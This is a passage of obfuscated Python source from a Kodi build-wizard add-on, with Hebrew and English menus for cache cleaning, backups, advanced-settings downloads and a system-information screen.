		O0OOO0O0OOOO0OO0O ='true'if INCLUDEEXODUS =='true'else 'false'#line:3189
		OOOOO0O00O000OO0O ='true'if INCLUDEONECHAN =='true'else 'false'#line:3190
		OO0O000O00OOOO0O0 ='true'if INCLUDESALTS =='true'else 'false'#line:3191
		OOOOO0OO0OOOOO0O0 ='true'if INCLUDESALTSHD =='true'else 'false'#line:3192
	O0OO0OOO0OO0O0000 =wiz .getSize (PACKAGES )#line:3193
	OO0O0OO0000OO0O00 =wiz .getSize (THUMBS )#line:3194
	OOO0OOO0OOOO0O000 =wiz .getCacheSize ()#line:3195
	OOO0OO000O00OOO00 =O0OO0OOO0OO0O0000 +OO0O0OO0000OO0O00 +OOO0OOO0OOOO0O000 #line:3196
	OO000O000OOO00O00 =['Daily','Always','3 Days','Weekly']#line:3197
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:3198
	if view =="clean"or SHOWMAINT =='true':#line:3199
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOO0OO000O00OOO00 ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:3200
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOO0OOO0OOOO0O000 ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:3201
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0OO0OOO0OO0O0000 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:3202
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0O0OO0000OO0O00 ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:3203
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:3204
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:3205
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:3206
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:3207
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:3208
	if view =="addon"or SHOWMAINT =='false':#line:3209
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:3210
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:3211
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:3212
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:3213
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:3214
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:3215
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:3216
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:3217
	if view =="misc"or SHOWMAINT =='true':#line:3218
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:3219
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:3220
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:3221
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:3222
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:3223
		addFile ('View Errors in Log: %s'%(OO00OO00O00O0OO0O ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:3224
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:3225
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:3226
		addFile ('Clear Wizard Log File%s'%OO0O0OO0OO0O00O0O ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:3227
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:3228
	if view =="backup"or SHOWMAINT =='true':#line:3229
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:3230
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:3231
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:3232
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:3233
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:3234
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3235
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:3236
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:3237
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3238
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:3239
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:3240
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3241
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:3242
	if view =="tweaks"or SHOWMAINT =='true':#line:3243
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:3244
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:3245
		else :#line:3246
			if os .path .exists (ADVANCED ):#line:3247
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:3248
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3249
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3250
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:3251
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:3252
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:3253
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:3254
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:3255
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:3256
	addFile ('Show All Maintenance: %s'%OOO0000000O0000O0 .replace ('true',OO0000OOOO00OOO00 ).replace ('false',O0OOO00OO00000OOO ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:3257
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:3258
	addFile ('Third Party Wizards: %s'%OO00OOOO000O0O0OO .replace ('true',OO0000OOOO00OOO00 ).replace ('false',O0OOO00OO00000OOO ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:3259
	if OO00OOOO000O0O0OO =='true':#line:3260
		O0OO000OO0O000O0O =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:3261
		O000000O0OO0O00OO =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:3262
		OO0O0OO0O00O0OOOO =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:3263
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0OO000OO0O000O0O ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:3264
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O000000O0OO0O00OO ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:3265
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO0O0OO0O00O0OOOO ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:3266
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:3267
	addFile ('ניקוי אוטומטי בהפעלה: %s'%O0O0OO0O0OOO0OO00 .replace ('true',OO0000OOOO00OOO00 ).replace ('false',O0OOO00OO00000OOO ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:3268
	if O0O0OO0O0OOO0OO00 =='true':#line:3269
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%OO000O000OOO00O00 [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:3270
		addFile ('--- ניקוי קאש בהפעלה: %s'%O0O000OOOO0OOO0O0 .replace ('true',OO0000OOOO00OOO00 ).replace ('false',O0OOO00OO00000OOO ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:3271
		addFile ('--- ניקוי חבילות בהפעלה: %s'%OO0O000OOO0OO00OO .replace ('true',OO0000OOOO00OOO00 ).replace ('false',O0OOO00OO00000OOO ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:3272
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O0O0O000OOOOOO000 .replace ('true',OO0000OOOO00OOO00 ).replace ('false',O0OOO00OO00000OOO ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:3273
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:3274
	addFile ('Include Video Cache in Clear Cache: %s'%O00O00OOO00O0OOO0 .replace ('true',OO0000OOOO00OOO00 ).replace ('false',O0OOO00OO00000OOO ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:3275
	if O00O00OOO00O0OOO0 =='true':#line:3276
		addFile ('--- Include All Video Addons: %s'%OO000OOOOOOOO0000 .replace ('true',OO0000OOOO00OOO00 ).replace ('false',O0OOO00OO00000OOO ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:3277
		addFile ('--- Include Bob: %s'%O0OO00OOO000O00O0 .replace ('true',OO0000OOOO00OOO00 ).replace ('false',O0OOO00OO00000OOO ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:3278
		addFile ('--- Include Phoenix: %s'%OO0OO0OO0OO0OO0OO .replace ('true',OO0000OOOO00OOO00 ).replace ('false',O0OOO00OO00000OOO ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:3279
		addFile ('--- Include Specto: %s'%O000O00O0OO0OOO0O .replace ('true',OO0000OOOO00OOO00 ).replace ('false',O0OOO00OO00000OOO ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:3280
		addFile ('--- Include Exodus: %s'%O0OOO0O0OOOO0OO0O .replace ('true',OO0000OOOO00OOO00 ).replace ('false',O0OOO00OO00000OOO ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:3281
		addFile ('--- Include Salts: %s'%OO0O000O00OOOO0O0 .replace ('true',OO0000OOOO00OOO00 ).replace ('false',O0OOO00OO00000OOO ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:3282
		addFile ('--- Include Salts HD Lite: %s'%OOOOO0OO0OOOOO0O0 .replace ('true',OO0000OOOO00OOO00 ).replace ('false',O0OOO00OO00000OOO ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:3283
		addFile ('--- Include One Channel: %s'%OOOOO0O00O000OO0O .replace ('true',OO0000OOOO00OOO00 ).replace ('false',O0OOO00OO00000OOO ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:3284
		addFile ('--- Include Genesis: %s'%OO0OO0000000O0000 .replace ('true',OO0000OOOO00OOO00 ).replace ('false',O0OOO00OO00000OOO ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:3285
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:3286
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:3287
	setView ('files','viewType')#line:3288
def advancedWindow (url =None ):#line:3290
	if not ADVANCEDFILE =='http://':#line:3291
		if url ==None :#line:3292
			OO000OO0OO0O0OOOO =wiz .workingURL (ADVANCEDFILE )#line:3293
			OO00OOO000OOOOOOO =uservar .ADVANCEDFILE #line:3294
		else :#line:3295
			OO000OO0OO0O0OOOO =wiz .workingURL (url )#line:3296
			OO00OOO000OOOOOOO =url #line:3297
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3298
		if os .path .exists (ADVANCED ):#line:3299
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:3300
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3301
		if OO000OO0OO0O0OOOO ==True :#line:3302
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:3303
			O00O0O00O0OO0OOO0 =wiz .openURL (OO00OOO000OOOOOOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:3304
			O0OO000000O0OOO0O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O00O0O00O0OO0OOO0 )#line:3305
			if len (O0OO000000O0OOO0O )>0 :#line:3306
				for OOOO00OOOOO0OOOO0 ,OO0O00OOO0OOO00OO ,url ,OOO000OOO000OOO0O ,OO0O0OOO000000O0O ,OOOO0O00OO0O0O000 in O0OO000000O0OOO0O :#line:3307
					if OO0O00OOO0OOO00OO .lower ()=="yes":#line:3308
						addDir ("[B]%s[/B]"%OOOO00OOOOO0OOOO0 ,'advancedsetting',url ,description =OOOO0O00OO0O0O000 ,icon =OOO000OOO000OOO0O ,fanart =OO0O0OOO000000O0O ,themeit =THEME3 )#line:3309
					else :#line:3310
						addFile (OOOO00OOOOO0OOOO0 ,'writeadvanced',OOOO00OOOOO0OOOO0 ,url ,description =OOOO0O00OO0O0O000 ,icon =OOO000OOO000OOO0O ,fanart =OO0O0OOO000000O0O ,themeit =THEME2 )#line:3311
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:3312
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OO000OO0OO0O0OOOO )#line:3313
	else :wiz .log ("[Advanced Settings] not Enabled")#line:3314
def writeAdvanced (OOO0O0O0O0O0OOOO0 ,O0OO00OO0OO0000OO ):#line:3316
	O0O00000OOOO0000O =wiz .workingURL (O0OO00OO0OO0000OO )#line:3317
	if O0O00000OOOO0000O ==True :#line:3318
		if os .path .exists (ADVANCED ):OOO0OO00O0OOOO0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOO0O0O0O0O0OOOO0 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:3319
		else :OOO0OO00O0OOOO0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOO0O0O0O0O0OOOO0 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:3320
		if OOO0OO00O0OOOO0O0 ==1 :#line:3322
			OOOOO0O0OOO0O0OOO =wiz .openURL (O0OO00OO0OO0000OO )#line:3323
			O0OO00000OO0000O0 =open (ADVANCED ,'w');#line:3324
			O0OO00000OO0000O0 .write (OOOOO0O0OOO0O0OOO )#line:3325
			O0OO00000OO0000O0 .close ()#line:3326
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:3327
			wiz .killxbmc (True )#line:3328
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:3329
	else :wiz .log ("[Advanced Settings] URL not working: %s"%O0O00000OOOO0000O );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:3330
def viewAdvanced ():#line:3332
	OO0000O00OOO00000 =open (ADVANCED )#line:3333
	OOOOOOO0OOOOO0OOO =OO0000O00OOO00000 .read ().replace ('\t','    ')#line:3334
	wiz .TextBox (ADDONTITLE ,OOOOOOO0OOOOO0OOO )#line:3335
	OO0000O00OOO00000 .close ()#line:3336
def removeAdvanced ():#line:3338
	if os .path .exists (ADVANCED ):#line:3339
		wiz .removeFile (ADVANCED )#line:3340
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:3341
def showAutoAdvanced ():#line:3343
	notify .autoConfig ()#line:3344
def getIP ():#line:3346
	OOO0000O0O000OO00 ='http://whatismyipaddress.com/'#line:3347
	if not wiz .workingURL (OOO0000O0O000OO00 ):return 'Unknown','Unknown','Unknown'#line:3348
	O00O0O0OOOOO00OO0 =wiz .openURL (OOO0000O0O000OO00 ).replace ('\n','').replace ('\r','')#line:3349
	if not 'Access Denied'in O00O0O0OOOOO00OO0 :#line:3350
		O0O00O000O000O0O0 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (O00O0O0OOOOO00OO0 )#line:3351
		O0O0000O000OOOO00 =O0O00O000O000O0O0 [0 ]if (len (O0O00O000O000O0O0 )>0 )else 'Unknown'#line:3352
		OO0O00O000O0O0O0O =re .compile ('"font-size:14px;">(.+?)</td>').findall (O00O0O0OOOOO00OO0 )#line:3353
		OO0O0OO0000OOOO00 =OO0O00O000O0O0O0O [0 ]if (len (OO0O00O000O0O0O0O )>0 )else 'Unknown'#line:3354
		O000O0O0OOO0OOO00 =OO0O00O000O0O0O0O [1 ]+', '+OO0O00O000O0O0O0O [2 ]+', '+OO0O00O000O0O0O0O [3 ]if (len (OO0O00O000O0O0O0O )>2 )else 'Unknown'#line:3355
		return O0O0000O000OOOO00 ,OO0O0OO0000OOOO00 ,O000O0O0OOO0OOO00 #line:3356
	else :return 'Unknown','Unknown','Unknown'#line:3357
def systemInfo ():#line:3359
	OO00OOO00OO0O0000 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:3373
	O000OOOO00OO00000 =[];OOO0OOO0O0OO0O00O =0 #line:3374
	for O0OO0OO00OOOO0OO0 in OO00OOO00OO0O0000 :#line:3375
		O0O00000OO0O00OOO =wiz .getInfo (O0OO0OO00OOOO0OO0 )#line:3376
		OOOOO0OOO00OOO0OO =0 #line:3377
		while O0O00000OO0O00OOO =="Busy"and OOOOO0OOO00OOO0OO <10 :#line:3378
			O0O00000OO0O00OOO =wiz .getInfo (O0OO0OO00OOOO0OO0 );OOOOO0OOO00OOO0OO +=1 ;wiz .log ("%s sleep %s"%(O0OO0OO00OOOO0OO0 ,str (OOOOO0OOO00OOO0OO )));xbmc .sleep (1000 )#line:3379
		O000OOOO00OO00000 .append (O0O00000OO0O00OOO )#line:3380
		OOO0OOO0O0OO0O00O +=1 #line:3381
	OO00OO00O0000OO00 =O000OOOO00OO00000 [8 ]if 'Una'in O000OOOO00OO00000 [8 ]else wiz .convertSize (int (float (O000OOOO00OO00000 [8 ][:-8 ]))*1024 *1024 )#line:3382
	O0OO0OOO00O0OO000 =O000OOOO00OO00000 [9 ]if 'Una'in O000OOOO00OO00000 [9 ]else wiz .convertSize (int (float (O000OOOO00OO00000 [9 ][:-8 ]))*1024 *1024 )#line:3383
	O0OO0OO0OOOOO0000 =O000OOOO00OO00000 [10 ]if 'Una'in O000OOOO00OO00000 [10 ]else wiz .convertSize (int (float (O000OOOO00OO00000 [10 ][:-8 ]))*1024 *1024 )#line:3384
	OO0O0O0OOO0O00O00 =wiz .convertSize (int (float (O000OOOO00OO00000 [11 ][:-2 ]))*1024 *1024 )#line:3385
	O0OO0OOO0OOO00OO0 =wiz .convertSize (int (float (O000OOOO00OO00000 [12 ][:-2 ]))*1024 *1024 )#line:3386
	OOO0O0OOO0OOOO0OO =wiz .convertSize (int (float (O000OOOO00OO00000 [13 ][:-2 ]))*1024 *1024 )#line:3387
	OOOOOO000000OO0O0 ,O0O000O0O0OO0OO00 ,O0OOOO00OOO0O0OO0 =getIP ()#line:3388
	O0000O0OOOO0OO0O0 =[];OO0O0O000OOO000O0 =[];O0OOOOOO000OO00O0 =[];OO00O00O0OO00OO0O =[];O0O0OOO0000O0000O =[];OOOOOOO0OOO0O000O =[];OOOOOOO00O00OOOOO =[]#line:3390
	O00O00O00OO00OOO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3392
	for OO000O0000OOOO000 in sorted (O00O00O00OO00OOO0 ,key =lambda OOO000OOO0O0OOO0O :OOO000OOO0O0OOO0O ):#line:3393
		O00O0O0O0O000O000 =os .path .split (OO000O0000OOOO000 [:-1 ])[1 ]#line:3394
		if O00O0O0O0O000O000 =='packages':continue #line:3395
		OO0000OO00O0OOO00 =os .path .join (OO000O0000OOOO000 ,'addon.xml')#line:3396
		if os .path .exists (OO0000OO00O0OOO00 ):#line:3397
			OOOOO00O00OO0OO0O =open (OO0000OO00O0OOO00 )#line:3398
			OOOOO0O0O0OOO0OOO =OOOOO00O00OO0OO0O .read ()#line:3399
			O00000OO000000OO0 =re .compile ("<provides>(.+?)</provides>").findall (OOOOO0O0O0OOO0OOO )#line:3400
			if len (O00000OO000000OO0 )==0 :#line:3401
				if O00O0O0O0O000O000 .startswith ('skin'):OOOOOOO00O00OOOOO .append (O00O0O0O0O000O000 )#line:3402
				if O00O0O0O0O000O000 .startswith ('repo'):O0O0OOO0000O0000O .append (O00O0O0O0O000O000 )#line:3403
				else :OOOOOOO0OOO0O000O .append (O00O0O0O0O000O000 )#line:3404
			elif not (O00000OO000000OO0 [0 ]).find ('executable')==-1 :OO00O00O0OO00OO0O .append (O00O0O0O0O000O000 )#line:3405
			elif not (O00000OO000000OO0 [0 ]).find ('video')==-1 :O0OOOOOO000OO00O0 .append (O00O0O0O0O000O000 )#line:3406
			elif not (O00000OO000000OO0 [0 ]).find ('audio')==-1 :OO0O0O000OOO000O0 .append (O00O0O0O0O000O000 )#line:3407
			elif not (O00000OO000000OO0 [0 ]).find ('image')==-1 :O0000O0OOOO0OO0O0 .append (O00O0O0O0O000O000 )#line:3408
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3410
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000OOOO00OO00000 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3411
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000OOOO00OO00000 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3412
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3413
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000OOOO00OO00000 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3414
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000OOOO00OO00000 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3415
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3417
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000OOOO00OO00000 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3418
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000OOOO00OO00000 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3419
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3421
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO00O0000OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3422
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0OOO00O0OO000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3423
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0OO0OOOOO0000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3424
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3426
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O0O0OOO0O00O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3427
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0OOO0OOO00OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3428
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0OOO0OOOO0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3429
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3431
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000OOOO00OO00000 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3432
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOOO000000OO0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3433
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O0O0OO0OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3434
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOOO00OOO0O0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3435
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000OOOO00OO00000 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3436
	OOO0OO00OOO0O00OO =len (O0000O0OOOO0OO0O0 )+len (OO0O0O000OOO000O0 )+len (O0OOOOOO000OO00O0 )+len (OO00O00O0OO00OO0O )+len (OOOOOOO0OOO0O000O )+len (OOOOOOO00O00OOOOO )+len (O0O0OOO0000O0000O )#line:3438
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,OOO0OO00OOO0O00OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3439
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOOOOO000OO00O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3440
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO00O00O0OO00OO0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3441
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0O0O000OOO000O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3442
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0000O0OOOO0OO0O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3443
